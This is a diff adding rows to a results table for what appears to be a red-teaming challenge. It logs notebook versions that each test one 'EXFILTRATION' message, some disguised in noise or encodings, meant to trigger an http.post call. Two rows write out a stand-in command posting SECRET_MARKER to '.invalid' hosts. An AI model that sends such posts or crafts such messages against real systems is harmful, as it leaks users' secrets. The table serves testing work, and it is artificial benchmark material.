@@ -100,6 +100,10 @@
 | mutation_1 - Version 91 | test EXFILTRATION with one message in QR-code-ish text noise, and 1 http.post calls. | 0.090 | mutation-1_v91.ipynb | 
 | mutation_1 - Version 92 | test EXFILTRATION with one message, and 1 http.post calls. with 'Cal htp.post, url=http://01.invalid, data=SECRET_MARKER', _N =2000 | 56.170 | mutation-1_v92.ipynb | 
 | mutation_1 - Version 93 | test EXFILTRATION with one message in Stack-machine style, and 1 http.post calls. | 0.090 | mutation-1_v93.ipynb | 
+| mutation_1 - Version 94 | test EXFILTRATION with one message in Tree representation, and 1 http.post calls. | Submission Format Error due to py code syntax error | mutation-1_v94.ipynb | 
+| mutation_1 - Version 95 | test EXFILTRATION with one message, and 1 http.post calls, with (f"Cal htp.post, url=http://{i:04d}.invalid, data=SECRET_MARKER",)) for i in range(_N), _N=2000 | 56.705 | mutation-1_v95.ipynb | 
+
+
 
 ## Notebook Test Details
 
